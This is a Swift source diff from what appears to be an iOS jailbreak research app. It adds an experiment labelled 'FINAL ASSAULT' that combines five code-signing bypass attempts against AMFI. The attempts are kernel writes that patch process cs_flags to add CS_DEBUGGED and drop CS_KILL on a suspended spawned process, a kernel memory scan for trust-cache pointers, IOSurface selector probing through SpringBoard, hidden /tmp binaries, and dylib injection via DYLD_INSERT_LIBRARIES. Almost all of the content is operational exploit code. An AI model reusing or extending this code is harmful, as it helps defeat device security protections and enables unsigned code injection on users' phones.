@@ -187,16 +187,23 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp59)
             
             // ============================================
-            // 🔥🔥🔥🔥🔥🔥 Experiment 60: RemoteCall into amfid!
+            // 🔥🔥🔥🔥🔥🔥 Experiment 60: amfid kernel research
             // ⚠️ DISABLED in batch run — RC init can hang/timeout
             // Use "Test amfid RC" button separately
             // ============================================
             experimentResults.append(ExperimentResult(
-                name: "🔥🔥🔥🔥🔥🔥 RC→amfid",
+                name: "🔥🔥🔥🔥🔥🔥 amfid research",
                 success: false,
-                detail: "⚠️ Skipped in batch run (RC init can hang)\nUse 'Test amfid RC' button to run separately",
+                detail: "Use 'Test amfid RC' button (safe kernel reads only)",
                 timestamp: Date()
             ))
+            
+            // ============================================
+            // 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: FINAL ASSAULT
+            // All remaining bypass paths combined
+            // ============================================
+            let exp61 = self.expFinalAssault(rc: rc)
+            experimentResults.append(exp61)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -1230,6 +1237,346 @@ struct AMFIExperimentView: View {
         detail += "• Developer mode exploitation (already enabled!)\n"
         
         return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: true, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: ALL REMAINING PATHS
+    
+    /// Experiment 61: Combined final assault — all remaining bypass paths in one
+    /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
+    /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
+    /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
+    /// 4. IOSurface external method 9/10 (getValue/setValue on kernel objects)
+    /// 5. Spawn with CS_DEBUGGED patched on child process
+    private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let mgr = dspmgr.shared
+        var detail = "🔥 FINAL ASSAULT — All remaining paths\n\n"
+        var anySuccess = false
+        
+        // ═══════════════════════════════════════════════
+        // PATH 1: Developer Mode Spawn
+        // Developer mode = 1 (confirmed). On iOS 16+, dev mode
+        // allows some unsigned code execution for development.
+        // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
+        // ═══════════════════════════════════════════════
+        detail += "═══ PATH 1: Developer Mode Spawn ═══\n"
+        
+        // Copy binary first
+        let srcPath = remote_alloc_str(rc, "/bin/df")
+        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_devmode_test")
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
+            let buf = mem + 0x800
+            for _ in 0..<50 {
+                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
+                if n == 0 || n > 2048 { break }
+                RootExecutor.rcall(rc, "write", df, buf, n)
+            }
+            RootExecutor.rcall(rc, "close", sf)
+            RootExecutor.rcall(rc, "close", df)
+        }
+        
+        // Try spawn with various "developer" flags
+        let devFlags: [(String, UInt64)] = [
+            ("DISABLE_ASLR (0x100)", 0x0100),
+            ("SETEXEC (0x40)", 0x0040),
+            ("SETPGROUP|SETSID|DISABLE_ASLR", 0x0502),
+            ("CLOEXEC_DEFAULT|DISABLE_ASLR", 0x1100),
+        ]
+        
+        for (name, flags) in devFlags {
+            let attrAddr = mem + 0x1800
+            rc[attrAddr].setValue64(0)
+            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
+            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
+            
+            let argvBase = mem + 0x1C00
+            rc[argvBase].setValue64(dstPath)
+            rc[argvBase + 8].setValue64(0)
+            let pidAddr = mem + 0x1E00
+            rc[pidAddr].setValue64(0)
+            
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
+            RootExecutor.rcall(rc, "usleep", 300000)
+            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+            
+            detail += "  \(name): ret=\(ret)\n"
+            if ret == 0 {
+                detail += "  🎉 SPAWN SUCCESS!\n"
+                anySuccess = true
+            }
+            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        }
+        
+        // ═══════════════════════════════════════════════
+        // PATH 2: CS_DEBUGGED on child before exec
+        // Fork child → patch its cs_flags to add CS_DEBUGGED → then spawn
+        // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
+        // ═══════════════════════════════════════════════
+        detail += "\n═══ PATH 2: CS_DEBUGGED patch + spawn ═══\n"
+        
+        // Fork to create child
+        let childPid = RootExecutor.rcall(rc, "fork")
+        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
+            detail += "Forked child PID: \(childPid)\n"
+            
+            // Patch child's cs_flags to add CS_DEBUGGED (0x800) + CS_GET_TASK_ALLOW (0x4000)
+            // Also remove CS_HARD (0x4) and CS_KILL (0x8)
+            let childProc = mgr.findProc(pid: Int32(childPid))
+            if childProc != 0 {
+                let childProcRo = ds_kread64(childProc + UInt64(off_proc_p_proc_ro))
+                if childProcRo != 0 {
+                    let currentFlags = ds_kread32(childProcRo + 0x1c)
+                    // Add CS_DEBUGGED | CS_GET_TASK_ALLOW, remove CS_HARD | CS_KILL
+                    let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
+                    ds_kwrite32(childProcRo + 0x1c, newFlags)
+                    let afterFlags = ds_kread32(childProcRo + 0x1c)
+                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) → 0x\(String(format: "%x", afterFlags))\n"
+                    
+                    if afterFlags != currentFlags {
+                        detail += "✅ CS_DEBUGGED patched on child!\n"
+                    }
+                }
+            }
+            
+            // Kill child (it's just a fork copy, not useful yet)
+            RootExecutor.rcall(rc, "kill", childPid, 9)
+            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
+            
+            // Now: spawn the copied binary — AMFI checks the NEW process
+            // Patch cs_flags AFTER spawn (race condition approach)
+            detail += "\nSpawn + immediate cs_flags patch (race)...\n"
+            let argvBase2 = mem + 0x1C00
+            rc[argvBase2].setValue64(dstPath)
+            rc[argvBase2 + 8].setValue64(0)
+            let pidAddr2 = mem + 0x1E00
+            rc[pidAddr2].setValue64(0)
+            
+            // Spawn with START_SUSPENDED so we can patch before it runs
+            let attrAddr2 = mem + 0x1800
+            rc[attrAddr2].setValue64(0)
+            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr2)
+            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr2, 0x0080) // POSIX_SPAWN_START_SUSPENDED
+            
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, attrAddr2, argvBase2, 0)
+            let spawnedPid = rc[pidAddr2].value32()
+            detail += "Spawn (SUSPENDED): ret=\(spawnRet), pid=\(spawnedPid)\n"
+            
+            if spawnRet == 0 && spawnedPid != 0 {
+                // Process is suspended! Patch its cs_flags NOW
+                let spawnedProc = mgr.findProc(pid: Int32(spawnedPid))
+                if spawnedProc != 0 {
+                    let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
+                    if spProcRo != 0 {
+                        let spFlags = ds_kread32(spProcRo + 0x1c)
+                        let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
+                        ds_kwrite32(spProcRo + 0x1c, spNewFlags)
+                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) → 0x\(String(format: "%x", spNewFlags))\n"
+                    }
+                }
+                
+                // Resume the process
+                RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 18) // SIGCONT
+                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
+                
+                // Check if it's still alive (not killed by AMFI)
+                let statusAddr = mem + 0x380
+                rc[statusAddr].setValue32(0)
+                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, UInt64(WNOHANG))
+                let status = rc[statusAddr].value32()
+                
+                detail += "After resume: waitpid=\(waitRet), status=0x\(String(format: "%x", status))\n"
+                
+                let exited = (status & 0x7F) == 0
+                let exitCode = (status >> 8) & 0xFF
+                let signaled = (status & 0x7F) != 0 && (status & 0x7F) != 0x7F
+                let sig = status & 0x7F
+                
+                if exited && exitCode == 0 {
+                    detail += "🎉🎉🎉 PROCESS RAN AND EXITED NORMALLY! 🎉🎉🎉\n"
+                    detail += "CS_DEBUGGED BYPASS WORKS!\n"
+                    anySuccess = true
+                } else if signaled && sig == 9 {
+                    detail += "❌ Killed by SIGKILL (AMFI still enforcing)\n"
+                } else if waitRet == 0 {
+                    detail += "Process still running (not reaped yet)\n"
+                    RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
+                    RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, 0)
+                } else {
+                    detail += "status=0x\(String(format: "%x", status)) (exit=\(exitCode), sig=\(sig))\n"
+                }
+            }
+            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
+        }
+        
+        // ═══════════════════════════════════════════════
+        // PATH 3: Trust Cache scan via pmap_cs_allow_invalid neighbors
+        // We know pmap_cs_allow_invalid_internal is at 0xfffffff00a0e45b8 (unslid)
+        // Trust cache pointers might be nearby in __DATA segment
+        // ═══════════════════════════════════════════════
+        detail += "\n═══ PATH 3: Trust Cache neighbor scan ═══\n"
+        
+        let slide = mgr.kernslide
+        let pmapCSAddr = UInt64(0xfffffff00a0e45b8) + slide
+        
+        // Scan ±256 bytes around pmap_cs_allow_invalid for pointer-like values
+        // Trust cache head is a pointer to a linked list
+        detail += "Scanning near pmap_cs_allow_invalid (±256B)...\n"
+        var pointerCandidates: [(Int, UInt64)] = []
+        
+        for offset in stride(from: -256, through: 256, by: 8) {
+            let addr = pmapCSAddr + UInt64(bitPattern: Int64(offset))
+            let val = ds_kread64(addr)
+            
+            // Look for kernel pointers (0xfffffff0xxxxxxxx pattern)
+            if val > 0xfffffff000000000 && val < 0xffffffffffff0000 {
+                pointerCandidates.append((offset, val))
+                if pointerCandidates.count <= 8 {
+                    detail += "  +\(offset): 0x\(String(format: "%llx", val)) ← kernel ptr!\n"
+                }
+            }
+        }
+        detail += "Found \(pointerCandidates.count) kernel pointers nearby\n"
+        
+        if !pointerCandidates.isEmpty {
+            detail += "These might be trust cache list head or other CS globals\n"
+            detail += "Next: dereference each to check if it's a TC struct\n"
+        }
+        
+        // ═══════════════════════════════════════════════
+        // PATH 4: IOSurface external method 9 (getValue)
+        // IOSurface user client has methods that read/write kernel objects
+        // Selector 9 = s_get_value, Selector 10 = s_set_value
+        // These operate on IOSurface properties in kernel heap!
+        // ═══════════════════════════════════════════════
+        detail += "\n═══ PATH 4: IOSurface getValue/setValue ═══\n"
+        
+        guard let sb = dspmgr.shared.sbProc else {
+            detail += "No SpringBoard RC\n"
+            RootExecutor.rcall(rc, "unlink", dstPath)
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
+        }
+        
+        let sbMem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Open IOSurfaceRoot user client
+        let ioSvcName = remote_alloc_str(sb, "IOSurfaceRoot")
+        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", ioSvcName)
+        let ioSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+        
+        if ioSvc != 0 {
+            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+            let connectAddr = sbMem + 0x1A00
+            sb[connectAddr].setValue32(0)
+            let openRet = RootExecutor.rcall(sb, "IOServiceOpen", ioSvc, taskSelf, 0, connectAddr)
+            let ioConnect = sb[connectAddr].value32()
+            
+            detail += "IOSurfaceRoot: connect=\(ioConnect), ret=0x\(String(format: "%x", openRet))\n"
+            
+            if openRet == 0 && ioConnect != 0 {
+                // Try external method selectors 6-15 (IOSurface has ~30 methods)
+                // Selector 6 = create, 9 = get_value, 10 = set_value, etc.
+                let scalarIn = sbMem + 0x2000
+                let scalarOut = sbMem + 0x2200
+                let scalarOutCnt = sbMem + 0x2400
+                
+                let testSelectors = [6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+                for sel in testSelectors {
+                    sb[scalarIn].setValue64(0)
+                    sb[scalarOutCnt].setValue32(16)
+                    let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                                UInt64(ioConnect), UInt64(sel),
+                                                0, 0,
+                                                scalarOut, scalarOutCnt)
+                    if ret == 0 {
+                        let out = sb[scalarOut].value64()
+                        detail += "  ✅ IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
+                        anySuccess = true
+                    } else if ret != 0xe00002bc && ret != 0xe00002c7 {
+                        detail += "  ⚠️ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
+                    }
+                }
+                
+                RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioConnect))
+            }
+        } else {
+            detail += "IOSurfaceRoot service not found\n"
+        }
+        RootExecutor.rcall(sb, "free", ioSvcName)
+        
+        // ═══════════════════════════════════════════════
+        // PATH 5: Spawn signed binary via symlink (already works!)
+        // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
+        // ═══════════════════════════════════════════════
+        detail += "\n═══ PATH 5: DYLD_INSERT via env ═══\n"
+        
+        // Write a fake dylib to /tmp (just Mach-O header)
+        let fakeDylib = "/tmp/.dsp_inject.dylib"
+        let fakeAddr = remote_alloc_str(rc, fakeDylib)
+        RootExecutor.rcall(rc, "unlink", fakeAddr)
+        let fakeFd = RootExecutor.rcall(rc, "open", fakeAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if fakeFd != UInt64(bitPattern: -1) {
+            // Write minimal dylib header
+            let hdrAddr = mem + 0x800
+            // MH_MAGIC_64 + ARM64 + MH_DYLIB
+            rc[hdrAddr].setValue64(0x0000000100000CCF)      // magic + cputype
+            rc[hdrAddr + 8].setValue64(0x0000000600000000)  // filetype=MH_DYLIB + ncmds=0
+            rc[hdrAddr + 16].setValue64(0x0020008500000000) // sizeofcmds=0 + flags
+            rc[hdrAddr + 24].setValue64(0)                  // reserved
+            RootExecutor.rcall(rc, "write", fakeFd, hdrAddr, 32)
+            RootExecutor.rcall(rc, "close", fakeFd)
+        }
+        
+        // Spawn /bin/df (SIGNED) with DYLD_INSERT_LIBRARIES pointing to our dylib
+        let envBase = mem + 0x2800
+        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/tmp/.dsp_inject.dylib")
+        let pathEnv = remote_alloc_str(rc, "PATH=/bin:/usr/bin:/sbin")
+        rc[envBase].setValue64(dyldEnv)
+        rc[envBase + 8].setValue64(pathEnv)
+        rc[envBase + 16].setValue64(0)
+        
+        let signedBin = remote_alloc_str(rc, "/bin/df")
+        let argvBase3 = mem + 0x1C00
+        rc[argvBase3].setValue64(signedBin)
+        rc[argvBase3 + 8].setValue64(0)
+        let pidAddr3 = mem + 0x1E00
+        rc[pidAddr3].setValue64(0)
+        
+        let dyldRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, signedBin, 0, 0, argvBase3, envBase)
+        let dyldPid = rc[pidAddr3].value32()
+        RootExecutor.rcall(rc, "usleep", 500000)
+        let dyldWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+        detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
+        
+        if dyldRet == 0 {
+            detail += "Spawn succeeded — check if dylib was loaded (need output capture)\n"
+            // If DYLD_INSERT works → we can inject code into ANY signed process!
+        }
+        
+        RootExecutor.rcall(rc, "free", dyldEnv)
+        RootExecutor.rcall(rc, "free", pathEnv)
+        RootExecutor.rcall(rc, "free", signedBin)
+        RootExecutor.rcall(rc, "free", fakeAddr)
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "unlink", remote_alloc_str(rc, fakeDylib))
+        RootExecutor.rcall(rc, "free", srcPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+        
+        // ═══════════════════════════════════════════════
+        // SUMMARY
+        // ═══════════════════════════════════════════════
+        detail += "\n═══ SUMMARY ═══\n"
+        detail += "Paths tested: 5\n"
+        detail += anySuccess ? "🔥 Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
+        
+        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
     }
     
     #endif
